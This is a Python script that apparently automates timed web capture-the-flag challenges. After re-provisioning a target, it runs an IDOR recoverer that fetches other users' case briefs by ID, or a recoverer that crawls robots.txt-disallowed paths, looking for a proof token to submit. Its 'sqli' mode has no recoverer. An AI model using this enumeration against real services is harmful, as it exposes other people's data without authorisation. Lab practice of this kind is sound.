#!/usr/bin/env python3
"""One-shot provision+solve for a timed Web target (60s server clock that starts
when the target is READY). Minimises latency: fresh variant via retry, then tight
poll of the target URL; the instant it serves the app, run the recoverer and submit.
Usage: web_tt_oneshot.py <challenge_id/mode> <kind: idor|backup|sqli>
"""
import sys, re, time, requests
sys.path.insert(0, "~/ctf")
from gm import GM

PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
UA = {"User-Agent": "ctf-recon"}

def recover_idor(base, s):
    s.get(base + "/", timeout=10)
    h = s.get(base + "/api/history", timeout=10).json()
    cur = h.get("current_user"); ev = h.get("events", []) or []
    ids = [e["case_id"] for e in ev if e.get("owner") and e.get("owner") != cur]
    ids += [e.get("case_id") for e in ev]
    for cid in ids:
        if cid is None:
            continue
        m = PROOF_RE.search(s.get(base + "/api/briefs/%s" % cid, timeout=10).text)
        if m:
            return m.group(0)
    return None

def recover_backup(base, s):
    rb = s.get(base + "/robots.txt", timeout=10).text
    for d in [m.group(1) for m in re.finditer(r"(?im)^\s*Disallow:\s*(\S+)", rb)] + ["/"]:
        if not d.startswith("/"):
            d = "/" + d
        html = s.get(base + d, timeout=10).text
        m = PROOF_RE.search(html)
        if m:
            return m.group(0)
        for href in re.findall(r'href="([^"]+)"', html):
            if href.startswith(("http", "//", "#")) or "/assets/" in href:
                continue
            u = href if href.startswith("/") else d.rstrip("/") + "/" + href
            m2 = PROOF_RE.search(s.get(base + u, timeout=10).text)
            if m2:
                return m2.group(0)
    return None

RECOVER = {"idor": recover_idor, "backup": recover_backup}
APPMARK = {"idor": ("Pocket SOC", "my-cases"), "backup": ("Status Sprout", "snapshots"),
           "sqli": ("<html",)}

def app_response(url, marks):
    """Return (base_that_serves, session) if the app is live, else None."""
    for prefix in ("",):  # fresh timed targets are root-mounted
        base = url.rstrip("/") + prefix
        s = requests.Session(); s.headers.update(UA)
        try:
            r = s.get(base + "/", timeout=8)
        except Exception:
            return None
        if r.status_code == 200 and any(m in r.text for m in marks):
            return base, s
        if r.status_code == 408 and "expired" in r.text:
            return "EXPIRED", None
    return None

def main():
    ch = sys.argv[1]; kind = sys.argv[2]
    g = GM()
    marks = APPMARK[kind]; recover = RECOVER[kind]
    deadline_total = time.time() + 150
    variant_tries = 0
    while time.time() < deadline_total and variant_tries < 6:
        r = g.retry(ch)
        variant_tries += 1
        print("retry#%d -> result=%s" % (variant_tries, r.get("result")), flush=True)
        # tight poll for readiness of the CURRENT target
        poll_deadline = time.time() + 75
        while time.time() < poll_deadline:
            st = g.status(ch)
            tg = st.get("targets") or []
            if not tg:
                time.sleep(0.7); continue
            url = tg[0]["url"]
            res = app_response(url, marks)
            if res is None:
                time.sleep(0.7); continue
            if res == ("EXPIRED", None) or res == "EXPIRED":
                print("  current target expired; provisioning a newer variant", flush=True)
                break  # retry outer loop for a fresher variant
            base, s = res
            t0 = time.time()
            proof = recover(base, s)
            print("  READY %s -> proof=%s (%.1fs)" % (url[:40], proof, time.time() - t0), flush=True)
            if proof:
                sub = g.submit(ch, {"proof-1": proof})
                print("SUBMIT:", sub.get("result"), "flag=" + str(sub.get("flag")), flush=True)
                return
            time.sleep(0.7)
    print("exhausted without solve", flush=True)

if __name__ == "__main__":
    main()
